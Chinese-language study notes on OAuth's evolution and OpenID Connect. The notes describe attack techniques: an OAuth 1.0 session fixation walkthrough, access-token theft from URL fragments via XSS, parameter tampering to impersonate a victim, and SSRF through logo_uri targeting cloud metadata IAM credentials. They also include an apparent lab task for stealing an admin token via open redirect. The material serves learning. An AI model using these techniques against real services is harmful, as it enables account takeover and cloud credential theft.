OAuth诞生前：古老的"密码共享"时代

在OAuth诞生之前，互联网上几乎没有标准化的授权方案。当你想让一个第三方应用（比如一款帮你分析好友社交网络的工具）访问你在另一个平台（比如你的社交账号）上的数据时，唯一的办法就是把你的用户名和密码直接告诉它。但是，这样存在巨大的安全风险：用户与密码可能会被保存、滥用，甚至被恶意程序用来做任何事，而你毫无办法

后来，一些大型科技公司（比如Google、Facebook）意识到了这个巨大的安全风险，开始各自推出私有的授权方案，例如FlickrAuth和GoogleAuthSub。但这些方案彼此不兼容，开发者需要为每个不同的平台单独学习和适配，极其痛苦

OAuth 1.0：从"共享密码"到"安全授权"

为了解决这个”授权困境”，OAuth（开放授权）应运而生。它的故事始于2006年，当时Twitter的一位开发者Blaine Cook在为Twitter实现OpenID时，发现没有一个好的方案来安全地授权第三方应用访问Twitter的API。于是，他与Chris Messina等人一起发起讨论，最终催生了OAuth协议。

OAuth 1.0协议的核心思想是引入一个"令牌"（Token）的概念。它就像一把精心设计的、有时间限制的”临时钥匙”，第三方应用只需用这把"临时钥匙"来访问你的数据，整个过程完全不需要知道你的密码

OAuth授权过程中，有三个关键角色

  1. 用户：数据的拥有者，比如社交网站的会员
  2. 服务提供商：保存数据的地方，比如Google、微信
  3. 客户端应用：想要访问用户数据的第三方程序，比如一款分析社交好友的App

OAuth 1.0的安全性高度依赖于其复杂的加密签名。为了确保授权过程中的核心数据（如令牌、参数）在传输中不被篡改，开发者必须在客户端（Consumer）和服务提供方（Service Provider）之间对所有HTTP请求进行签名

1.签名的工作原理,其核心思想是服务提供方能够验证收到的请求，确实是由知道正确客户端密钥（Consumer Secret）的客户端发出的，并且在传输过程中未被修改

  1. 生成签名基础字符串：客户端将HTTP方法、请求URL以及所有OAuth参数（如oauth_consumer_key, oauth_token, oauth_timestamp, oauth_nonce）按字母顺序排序并拼接成一个长字符串
  2. 计算签名：使用客户端密钥（Consumer Secret）和令牌密钥作为密钥，对上述字符串应用哈希算法（如HMAC-SHA1或RSA-SHA1），生成最终的签名值
  3. 发送并验证：签名被放在请求头中发送。服务提供方收到请求后，用同样的方法和密钥计算出预期签名，与收到的签名进行比对，只有完全一致，请求才被认为是合法的

OAuth 1.0 存在的问题

  1. 开发者面临的沉重负担

    1. 实现成本极高：开发者需要为每个请求手动处理复杂的参数排序、编码和哈希计算。绝大多数开发者无法从头实现，不得不依赖第三方代码库，但这并没有完全简化问题。
    2. 维护和调试困难：签名计算的任何微小错误（如字符编码不一致、参数顺序错误）都会导致验证失败，排查这类问题极其耗时。
    3. 可读性差：签名机制将简单的授权过程变得异常晦涩，导致协议的实现门槛很高

  2. 致命的会话固定攻击

    1. 漏洞根源

      OAuth 1.0协议允许客户端（攻击者）在用户授权之前，就先获取一个“请求令牌”（Request Token）。同时，回调URL（oauth_callback）参数是动态且攻击者可控的。这两个缺陷组合起来，使攻击者可以预先准备一个包含自己“请求令牌”的恶意授权链接

    2. 攻击流程
      1. 准备陷阱：攻击者发起一个正常的OAuth流程，从服务提供方获取一个未授权的“请求令牌” T，并构造一个授权URL：https://service.com/authorize?oauth_token=T。
      2. 发送诱饵：攻击者将这个URL通过邮件、短信等方式发给受害者Carlos，并伪装成正常授权请求，诱导他点击。
      3. 受害者授权：当Carlos点击链接时，由于oauth_token=T是有效的，他可能会认为这是正常的登录授权。Carlos在页面上登录并完成授权。此时，攻击者持有的令牌T从“未授权”变成了“已授权”状态。

2009年6月发布的OAuth 1.0a正是为了修补会话固定漏洞

  1. 核心修复：强制绑定回调URL

    .0a版本强制规定，服务提供方必须将获取请求令牌时收到的oauth_callback参数值，与用户授权完成后实际回调的URL进行比对。如果两者不一致，整个流程必须终止。

实际上，更安全的实现是服务提供方直接忽略客户端在授权阶段传入的任何oauth_callback参数，强制使用获取请求令牌时约定的那个回调地址

  1. 新增验证码机制

    .0a还在授权流程的最后一步引入了验证码（oauth_verifier）。当用户授权后，服务提供方会生成一个临时验证码，客户端必须用这个验证码才能换取最终的访问令牌。这确保了即使攻击者截获了授权回调，没有这个验证码也无法完成令牌交换

需要特别注意的是，OAuth 1.0a的核心价值在于通过规范层面的强制性要求，堵住了回调URL被滥用的路径。但它并没有废除原有复杂的签名机制，因此开发者面临的复杂性依然存在

OAuth 2.0：从具体协议到更灵活更复杂的授权框架

鉴于 OAuth 1.0 的复杂性，OAuth 2.0 于 2012 年作为 RFC 6749 发布。它不再是具体的协议，而是一个 授权框架，旨在为不同场景（Web 应用、移动 App、IoT）提供灵活的授权方式。

最突出的变化：

  • 强制使用 HTTPS 保证通信安全，完全摒弃 OAuth 1.0 中复杂的加密签名。

  • 定义多种 授权类型（grant types），由开发者根据安全需求和客户端能力选择。

四种主要授权类型（Grant Types）

授权类型 安全性 核心特征 适用场景
授权码模式 高 返回一次性 code，后端用 client_secret 换 access_token 有后端服务器的传统 Web 应用
隐式模式 低 直接在 URL 片段中返回 access_token，无授权码 纯前端应用（SPA）—— 现已弃用
密码模式 极低 客户端直接收集用户名/密码换令牌 高度信任的官方应用 —— 已弃用
客户端凭证模式 中等 代表应用自身，不关联任何用户 服务器之间的后端通信

漏洞根源

  1. 令牌直接出现在 URL 片段中
  2. 无客户端认证（缺少 client_secret）
  3. 缺少令牌与用户的绑定验证（客户端实现错误）
  4. 没有刷新令牌（Refresh Token）
  5. 重定向 URI 验证宽松（常见配置错误）

漏洞利用

  1. 窃取令牌
    由于 access_token 直接出现在回调 URL 的 # 片段中（例如 https://app.com/callback#access_token=xyz），攻击者可以通过以下方式获取：

    读取浏览器历史记录
    通过 HTTP Referer 头泄露（如果页面有跳转）
    利用 XSS 漏洞：document.location.hash
    恶意浏览器插件
    2. 令牌替换 / 重放
    攻击者拿到令牌后，直接用它冒充受害者调用资源服务器的 API。
    如果客户端应用只验证令牌是否有效，但不检查令牌与当前用户的绑定关系（常见错误），攻击者用自己的令牌就能访问受害者的数据。
    3. 篡改回调参数
    有些客户端会从回调 URL 中直接读取 email 等参数，而不验证这些参数是否与令牌真正关联。
    攻击者可以手动修改回调 URL 中的 email 为 victim@example.com，然后让客户端用这个伪造的身份建立会话。

客户端凭证模式（Client Credentials Grant）

OAuth 2.1：从“可选安全”到“默认安全”的整合升级

抛弃

  • 隐式模式（Implicit Grant） —— 不再允许直接在 URL 片段中返回 access_token。

  • 密码模式（Resource Owner Password Credentials） —— 不再允许客户端收集用户密码换令牌。

增加（强制要求）

  • 强制 PKCE（Proof Key for Code Exchange） —— 所有客户端（包括有后端的 Web 应用）都必须在授权码模式中使用 PKCE。

  • 重定向 URI 精确匹配 —— 不再允许通配符或部分匹配，必须完整字符串匹配。

  • 禁止在 URL 中传递 Bearer Token —— 令牌只能通过 Authorization: Bearer 头发送。

总结

阶段 核心特点 主要问题
密码共享时代 第三方应用直接获取用户密码 密码泄露、权限无限制、无法撤销
OAuth 1.0 引入令牌，无需密码；但需要复杂签名 签名实现极其复杂；存在会话固定攻击
OAuth 1.0a 修复会话固定攻击（回调绑定 + verifier） 签名复杂问题未解决
OAuth 2.0 依赖 HTTPS，抛弃签名；提供多种授权类型 隐式模式、密码模式不安全；重定向 URI 匹配过松
OAuth 2.1 强制 PKCE；移除隐式/密码模式；精确匹配 URI；禁止 URL 传 token （无新增问题，是对 2.0 的安全强化）

OpenID 动态客户端注册协议

引入： OAuth 2.0 和 OpenID Connect 的基本场景
想象你要用“微信登录”某个网站（比如一个论坛）。流程通常是：

  1. 你点击“微信登录”。
  2. 论坛网站把你重定向到微信的授权页面。
  3. 你输入微信账号密码，授权论坛访问你的基本信息（头像、昵称等）。
  4. 微信给你一个“令牌”（token），你拿着令牌回到论坛。
  5. 论坛拿着令牌去微信那里询问：“这个令牌对应的用户是谁？”微信返回你的身份信息。

这里，论坛网站被称为 客户端（Client），微信被称为 授权服务器（Authorization Server） 或 OpenID 提供者（OP，OpenID Provider）。

什么是OpenID Connect？
OpenID Connect 是在 OAuth 2.0 之上增加的一个身份认证层。它让客户端不仅能拿到令牌，还能拿到一个“ID 令牌”，里面包含用户的唯一标识（比如 sub 字段，代表用户的 OpenID）。简单说，OAuth 2.0 管授权，OpenID Connect 管登录

什么是“客户端注册”？
在 OAuth/OpenID 的世界里，任何想要接入的网站（客户端）都必须先在授权服务器那里登记一下，就像你要进小区要先在门卫那里登记姓名、住址。登记后会获得一个 client_id（客户端编号），后续所有交互都要带上这个编号

传统注册：管理员在授权服务器的后台手动填写信息，比如应用名称、应用图标、URL允许的回调地址（redirect_uris，即用户授权后跳转回网站的地址）等等，比较麻烦

动态客户端注册：允许客户端通过发一个 HTTP 请求来自动完成登记。这样任何软件都可以临时注册，不需要人工审核。这是 RFC 7591 定义的。也就是说这个注册过程可以由任何人（包括你这样的攻击者）发起。你不需要证明你是某个合法的公司或开发者，只要向注册端点发送一个符合格式的 HTTP 请求，就能获得一个 client_id。补充：在生产环境中，一个客户端想认证服务器注册OpenID都需要一定的身份验证，验证该客户端的合法性

动态注册时填什么信息？
注册请求是一个 POST 请求，内容是 JSON，其中必须包含 redirect_uris（允许的回调地址），还可以包含很多可选信息
如：client_name（客户端名称）、logo_uri（客户端的图标地址，即图片 URL）、tos_uri（服务条款地址） 等等


OpenID Connect 是 OAuth 2.0 的扩展，它没有改变 OAuth 的基本流程，只是在换取令牌的响应中增加了一个 id_token 字段。其中id_token就是使用JWT。单纯的 OAuth 2.0 是可以完全不用 JWT

OIDC（OpenID Connect）的主要主键

  1. ID Token：是一个 JSON Web Token（JWT），包含关于身份提供者（Identity Provider, IdP）验证的用户身份的信息。包含用户标识（如 sub），认证时间（auth_time），认证方法（acr）等。
  2. UserInfo Endpoint：一个保护的资源端点，用于返回有关用户的附加信息，如姓名、电子邮件地址等。客户端使用访问令牌（Access Token）来请求用户信息。
  3. Authorization Endpoint：用于获取授权码（Authorization Code）的端点。客户端引导用户到该端点进行身份验证和授权。
  4. Token Endpoint：用于交换授权码或刷新令牌以获取访问令牌和 ID 令牌的端点。
  • /.well-known/openid-configuration 这个「路径后缀」是 OIDC 规范强制要求、绝对不能修改的；但前面的「Issuer 前缀」可以由厂商自定义（只要符合 URL 规范）。要强调一下这个注册点是OAuth服务器提供的，不是客户端

所以漏洞的环节在哪里？
由上面可知，攻击攻击者可以注册时可以提交 logo_uri，OAuth服务器处理的方式包括：

  1. 前置须知

    • 在动态客户端注册阶段（POST /reg），客户端都会在请求体中提供 logo_uri 字段（例如 “logo_uri”: “https://myapp.com/logo.png"）。
    • OAuth 服务器收到后，都会把这个 URL 保存下来，作为该客户端的元数据

  2. 标准实现 (返回字段)：许多实现遵循 RFC 7592，通过 registration_client_uri 管理接口返回 JSON 格式的完整客户端配置。客户端读取该 JSON 中的 logo_uri 字段，再自行解析展示

    1. 浏览器需要展示某个客户端的 Logo 时，它首先向 OAuth 服务器请求该客户端的元数据。
    2. 请求：GET /registration_client_uri/{client_id}（例如 /reg/abc123）
    3. OAuth 服务器返回一个 JSON，里面包含该客户端的所有注册信息，其中包括 logo_uri 字段。
    4. 响应体：{“client_id”:”abc123”, “logo_uri”:”https://myapp.com/logo.png“, …}
    5. 浏览器解析这个 JSON，拿到 logo_uri 的值（https://myapp.com/logo.png），然后浏览器自己向 myapp.com 发起请求，获取真正的图片并显示。

  3. 非标准实现 (专用接口)：为了方便浏览器直接展示，一些实现会提供一个专门的 HTTP 接口（如 /client/{client_id}/logo）来直接返回 Logo 图片。这个接口在后台可能会去请求 logo_uri 存储的地址

    1. 浏览器直接请求一个 OAuth 服务器提供的专用图片接口：GET /client/{client_id}/logo
    2. OAuth 服务器收到这个请求后，内部主动去请求它之前保存的 logo_uri 地址（例如 https://myapp.com/logo.png）。
    3. OAuth 服务器拿到响应内容（通常是图片）后，直接将其作为自己的响应体返回给浏览器。

云元数据服务是什么？
云元数据服务是一个运行在云服务器内部（例如AWS EC2、阿里云ECS、腾讯云CVM、Azure VM等）的特殊服务。它本质上是一个小型的HTTP Web服务器，可以通过特定的IP地址访问。

  1. 核心IP地址

    绝大多数云服务商统一使用 169.254.169.254 这个特殊的IP地址作为元数据服务的访问入口。这个地址是一个“链路本地地址”，意味着它只能在物理网络内部（即服务器本身）路由，外部互联网无法直接访问

  2. 主要数据内容

    实例标识：实例ID、主机名、公网/内网IP等 → 攻击者眼中的价值：确认目标实例身份，辅助后续攻击
    网络配置：安全组规则、子网信息、VPC信息等 → 攻击者眼中的价值：了解目标网络架构，寻找横向移动路径
    IAM角色凭证 (关键)：临时访问密钥 (AccessKeyId, SecretAccessKey) → 攻击者眼中的价值：可直接接管云服务控制台权限，是核心目标
    用户自定义数据：启动脚本、配置文件、密钥等 → 攻击者眼中的价值：脚本中常包含明文密码或源码，可直接利用
    其他系统信息：可用区、镜像ID、实例类型等 → 攻击者眼中的价值：了解运行环境，为后续渗透提供情报

  3. 设计初衷

0x05.利用开放重定向漏洞窃取 OAuth 访问令牌

本实验使用 OAuth 服务实现社交账号快捷登录。由于 OAuth 服务端的校验机制存在缺陷，攻击者可以诱导 访问令牌（access token） 泄露至客户端应用内的任意页面。
实验要求：

  • 找出博客网站上的 ** 开放重定向（Open Redirect）** 漏洞；

  • 利用该漏洞窃取管理员账号的 OAuth 访问令牌；

  • 借助拿到的访问令牌获取管理员的 API 密钥；

  • 通过实验横幅的提交按钮提交密钥，完成实验。

  • 重要提示

    • 你无法只靠在博客站点登录管理员账号，来直接获取 API 密钥。

  • 环境约束

    • 管理员会主动访问你从漏洞利用服务器发来的任意链接，且管理员在 OAuth 认证服务上始终保持已登录状态。

你可使用下方凭证登录自己的社交账号：账号：wiener密码：peter

提示需要使用重定向，但是这题的重定向与上题的重定向的利用不同，本题无法直接篡改回调域名，依托开放重定向接口+ OAuth 宽松校验组合漏洞，窃取高阶 access_token 访问令牌

这种统一开发的重定向的接口的设计初衷是什么？

  1. 客户端内置开放重定向接口

    主流网站普遍会开发全局通用跳转接口，核心业务设计目的：

    • 外链安全统一管控

      网站不允许前端直接暴露第三方外部链接，所有外链访问必须经过站内中转。方便后端统一拦截恶意域名、钓鱼站点、非法资源，做基础风险拦截与内容风控

    • 用户安全提示引导

      跳转外部站点前，统一加载中转页，提示用户「即将离开本站，前往第三方网站」，降低钓鱼攻击、恶意下载的风险，提升用户安全意识

    • 运营数据统计分析

      通过中转接口记录外链点击量、访问来源、引流渠道，用于运营统计、行为分析、推广效果溯源。

    • 路由迭代与旧链接兼容

      网站页面改版、域名更换、旧功能下线后，利用通用重定向接口批量转发旧地址，保证历史链接不失效，减少用户访问异常。

    • 灵活快速配置运营活动

      广告、活动、合作推广等外部链接无需修改代码，仅通过修改跳转参数即可快速上线、更换、下线，提升运维效率。

  2. OAuth 协议允许回调地址携带自定义 Query 参数

    • 保留用户浏览上下文，精准回流

      用户在商品页、文章页、购物车、个人收藏等页面触发第三方登录，需要在授权登录完成后，自动返回登录前正在浏览的页面，而非强制跳转首页，大幅提升使用体验。

    • 区分多业务模块与落地页

      同一套 OAuth 客户端对接论坛、商城、博客等多个业务板块，通过 redirect_uri 附带自定义参数，区分授权完成后的跳转落地位置。

    • 留存前置操作状态

      携带来源标识、页面 ID、操作行为等参数，登录后延续用户之前的操作流程，避免操作中断、数据丢失。

    • 渠道溯源与流量分流

      附加渠道码、推广标识等参数，实现第三方登录的渠道统计、流量划分与个性化业务配置

在安全合规的生产环境中，对统一重定向接口做严格白名单过滤是行业强制标准，绝大多数正规企业都会落地；但现实中仍有大量系统存在开放重定向漏洞，核心原因是业务妥协、校验疏漏、遗留系统等问题

业务需求妥协方面：

  • 运营需要灵活配置活动、广告、合作外链，不想每次修改都走白名单审核流程，因此放开了校验，仅做弱限制（如仅拦截部分恶意域名）；
  • 业务型跳转接口（如/post/next?path=）被开发者默认是「站内自用」，完全没做域名校验，没想到可被用于外网跳转

遗留系统与快速迭代：

  • 老系统、开源 CMS、第三方组件自带的重定向接口，默认配置无白名单，开发者未做安全加固；
  • 创业公司快速上线业务，跳过安全评审，直接照搬开源代码，漏了安全校验。

父子页面的相关知识

  • 简要概念

    对于一个打开的网页，姑且其记为父页面；这个网页中存在其他网页，记为子页面

  • 关键特性

    1. 父子页面是两个完全独立的网页

    2. 各自单独请求服务器、单独加载、单独运行 JS

    3. 跨域情况下，默认完全隔离

    4. 浏览器安全规则：

      不同网站的页面，不能互相读取地址、不能互相调用代码、不能拿数据。

      评论区、客服窗口、广告、播放器，经常用 iframe 嵌套
      但是由于同源策略的存在阻碍了父子页面的通信，所以postMessage实现跨窗口通信 API，就是解决这个问题的
